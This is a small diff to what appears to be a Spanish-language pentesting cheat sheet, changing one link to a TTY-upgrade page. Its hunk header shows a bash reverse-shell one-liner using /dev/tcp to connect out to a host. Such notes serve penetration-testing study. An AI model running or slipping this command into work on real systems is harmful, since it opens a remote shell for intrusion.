@@ -16,7 +16,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 Shell interactiva sobre TCP.
 Funciona en sistemas Linux con Bash compilado con soporte /dev/tcp.
 
-Para hacerla interactiva: [TTY-Interactiva](./TTY-Interactiva.md)
+Para hacerla interactiva: [TTY-Interactiva](../30-post-exploitation/10-linux/tty-interactiva.md)
 
 ---
 
